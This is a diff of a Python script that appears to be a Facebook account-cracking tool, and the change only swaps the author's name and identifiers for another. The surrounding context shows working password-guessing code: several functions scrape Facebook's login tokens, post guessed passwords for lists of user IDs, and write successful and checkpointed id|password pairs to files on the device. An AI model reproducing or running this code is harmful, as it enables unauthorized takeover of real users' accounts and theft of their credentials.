@@ -1,6 +1,6 @@
-#KHUSHAL VALA
+#Yacine VALA
 #WhatsApp : +1 (705) 713-7939
-#Github : KhushalVala
+#Github : YacineVala
 from os import path
 import os,base64,zlib,pip,urllib
 try:
@@ -1024,7 +1024,7 @@ logo ="""
 \033[1;34m╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ 
     
 \033[1;97m====================================================
-\033[1;97m[+]\033[1;95m    AUTHOR   \033[1;90m: \033[1;93mKHUSHAL VALA x BIKAS x MEHRO
+\033[1;97m[+]\033[1;95m    AUTHOR   \033[1;90m: \033[1;93mYacine VALA x BIKAS x MEHRO
 \033[1;97m[+]\033[1;95m    YOUTUBE \033[1;90m: \033[1;93mTechnical Tricks
 \033[1;97m[+]\033[1;95m    WHATSAPP \033[1;90m: \033[1;93m+91942844****
 \033[1;97m[+]\033[1;95m    VERSION  \033[1;90m:\033[1;93m10.1
@@ -1050,7 +1050,7 @@ tokenku=[]
 
 os.system(f'xdg-open https://youtube.com/@technicaltricks7982')
 
-def KHUSHAL():
+def Yacine():
 	clear()
 	#ckx()
 	print(f"[1] FILE CLONING")
@@ -1099,7 +1099,7 @@ def KHUSHAL():
 					
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [KHUSHAL] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [Yacine] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -1116,19 +1116,19 @@ def ffb(ids,names,passlist):
                         getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        Khushal=session.cookies.get_dict().keys()
-                        if "c_user" in Khushal:
+                        Yacine=session.cookies.get_dict().keys()
+                        if "c_user" in Yacine:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [KHUSHAL🤩-OK] %s | %s'%(ids,pas))
-                                open(f'/sdcard/KHUSHAL-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print(f'\r\r\033[1;32m [Yacine🤩-OK] %s | %s'%(ids,pas))
+                                open(f'/sdcard/Yacine-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in Khushal:
+                        elif 'checkpoint' in Yacine:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [KHUSHAL😟-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/KHUSHAL-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;126m [Yacine😟-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/Yacine-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -1142,7 +1142,7 @@ xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","G
 #
 def ffb1(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [KHUSHAL] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [Yacine] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -1159,19 +1159,19 @@ def ffb1(ids,names,passlist):
                         getlog = session.get(f'https://m.alpha.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://m.alpha.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post(f'https://m.alpha.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        Khushal=session.cookies.get_dict().keys()
-                        if "c_user" in Khushal:
+                        Yacine=session.cookies.get_dict().keys()
+                        if "c_user" in Yacine:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [KHUSHAL🤩-OK] %s | %s'%(ids,pas))
+                                print(f'\r\r\033[1;32m [Yacine🤩-OK] %s | %s'%(ids,pas))
                                 #cek_apk(session,coki)
-                                open(f'/sdcard/KHUSHAL-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open(f'/sdcard/Yacine-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in Khushal:
+                        elif 'checkpoint' in Yacine:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [KHUSHAL😟-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/KHUSHAL-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;126m [Yacine😟-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/Yacine-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -1183,7 +1183,7 @@ def ffb1(ids,names,passlist):
         loop+=1
 def ffb3(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [KHUSHAL] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [Yacine] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -1200,19 +1200,19 @@ def ffb3(ids,names,passlist):
                         getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post(f'https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        Khushal=session.cookies.get_dict().keys()
-                        if "c_user" in Khushal:
+                        Yacine=session.cookies.get_dict().keys()
+                        if "c_user" in Yacine:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [KHUSHAL🤩-OK] %s | %s'%(ids,pas))
-                                open(f'/sdcard/KHUSHAL-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print(f'\r\r\033[1;32m [Yacine🤩-OK] %s | %s'%(ids,pas))
+                                open(f'/sdcard/Yacine-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in Khushal:
+                        elif 'checkpoint' in Yacine:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [KHUSHAL😟-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/KHUSHAL-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;126m [Yacine😟-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/Yacine-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -1228,7 +1228,7 @@ xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","G
 def api(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write(f'\r\r\033[1;37m [KHUSHAL] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write(f'\r\r\033[1;37m [Yacine] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(f' ')[0]
                         try:
                                 ln = names.split(f' ')[1]
@@ -1281,15 +1281,15 @@ def api(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print(f'\r\r\033[1;32m [KHUSHAL🤩-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/KHUSHAL-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\033[1;32m [Yacine🤩-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/Yacine-OK.txt','a').write(ids+'|'+pas+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print(f'\r\r\x1b[38;5;126m [KHUSHAL😟-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open(f'/sdcard/KHUSHAL-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r\x1b[38;5;126m [Yacine😟-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open(f'/sdcard/Yacine-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
@@ -1302,7 +1302,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write(f'\r\r\033[1;37m [KHUSHAL] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write(f'\r\r\033[1;37m [Yacine] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(f' ')[0]
                         try:
                                 ln = names.split(f' ')[1]
@@ -1355,19 +1355,19 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print(f'\r\r\033[1;32m [KHUSHAL🤩-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/KHUSHAL-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\033[1;32m [Yacine🤩-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/Yacine-OK.txt','a').write(ids+'|'+pas+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r\x1b[38;5;126m [KHUSHAL😟-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open(f'/sdcard/KHUSHAL-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r\x1b[38;5;126m [Yacine😟-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open(f'/sdcard/Yacine-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open(f'/sdcard/KHUSHAL-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open(f'/sdcard/Yacine-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -1378,4 +1378,4 @@ def api1(ids,names,passlist):
                         pass
 
 
-KHUSHAL()
+Yacine()
